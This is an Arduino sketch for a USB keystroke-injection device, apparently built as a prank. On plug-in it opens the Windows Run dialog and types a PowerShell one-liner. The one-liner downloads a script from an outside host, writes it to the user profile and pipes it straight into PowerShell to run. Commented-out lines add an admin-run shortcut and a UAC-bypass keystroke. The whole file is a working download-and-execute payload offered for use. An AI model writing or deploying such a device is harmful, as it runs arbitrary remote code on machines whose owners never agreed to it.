#include <Keyboard.h>

// Utility function
void typeKeys(int keys [], unsigned int length){
  for (int i = 0; i < length; i++ ) {
    Keyboard.press(keys[i]);
  }
  delay(50);
  for (int i = 0; i < length; i++ ) {
    Keyboard.release(keys[i]);
  }

  
}

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.releaseAll();
  
}

void typeStringCustomDelay(char* line,int delayMS) {

  for(char* it = line; *it; ++it) {
      Keyboard.press((int)*it);
      delay(delayMS);
      Keyboard.release((int)*it);
  }
}


void setup()
{
  pinMode(LED_BUILTIN,OUTPUT);
  digitalWrite(LED_BUILTIN,HIGH);
  // Start Keyboard
  Keyboard.begin();

  // Start Payload
  delay(600);

  // Open run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);

  // Type in URL and open page!

  typeStringCustomDelay("powershell /NoExit /C wget 'http://mass-rickroll.host.qrl.nz/script.ps1' -o $env:USERPROFILE\\joe.ps1;Get-Content $env:USERPROFILE\\joe.ps1 | PowerShell.exe /NoExit",5);
  
  // int adminRunShortcut[3] = {KEY_LEFT_CTRL,KEY_LEFT_SHIFT,KEY_RETURN};

  // typeKeys(adminRunShortcut,3);
  delay(100);

  typeKey(KEY_RETURN);

  // delay(800);

  // int bypassUAC[2] = {KEY_LEFT_ALT,'y'};

  // typeKeys(bypassUAC,2);

  // End Payload

  // Stop Keyboard
  Keyboard.end();
  digitalWrite(LED_BUILTIN,LOW);

}

// Unused
void loop() {}